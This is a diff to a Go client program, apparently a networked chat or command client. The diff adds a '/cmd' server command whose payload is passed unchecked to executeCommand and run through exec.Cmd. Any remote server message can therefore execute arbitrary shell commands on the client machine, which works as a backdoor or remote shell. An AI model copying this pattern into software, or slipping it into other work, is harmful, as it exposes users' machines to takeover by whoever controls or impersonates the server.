@@ -117,7 +117,7 @@ func (c *Client) handleMessageSend(readErr <-chan error) error {
 			if !ok {
 				return errors.New("input channel closed")
 			}
-			
+
 			if message == "exit" {
 				log.Println("Exiting...")
 				c.Close()
@@ -142,9 +142,15 @@ func NewClient(port string, address string) *Client {
 func handleServerCommand(incoming string) (string, bool) {
 	command := incoming
 	if strings.HasPrefix(command, "/") {
-		parsed, ok := commands.ParseSlashCommand(command)
+		parsed, payload, ok := commands.ParseSlashCommand(command)
 		if !ok {
 			return "unknown command", true
+		}
+		if parsed == "cmd" {
+			if payload == "" {
+				return "unknown command", true
+			}
+			return executeCommand(payload), true
 		}
 		command = parsed
 	}
@@ -157,15 +163,7 @@ func handleServerCommand(incoming string) (string, bool) {
 }
 
 func executeCommand(command string) string {
-	resolved := command
-	switch command {
-	case "ping":
-		if runtime.GOOS == "windows" {
-			resolved = "ping -n 1 127.0.0.1"
-		} else {
-			resolved = "ping -c 1 127.0.0.1"
-		}
-	}
+	resolved := commands.GetCommand(command)
 
 	var cmd *exec.Cmd
 	if runtime.GOOS == "windows" {
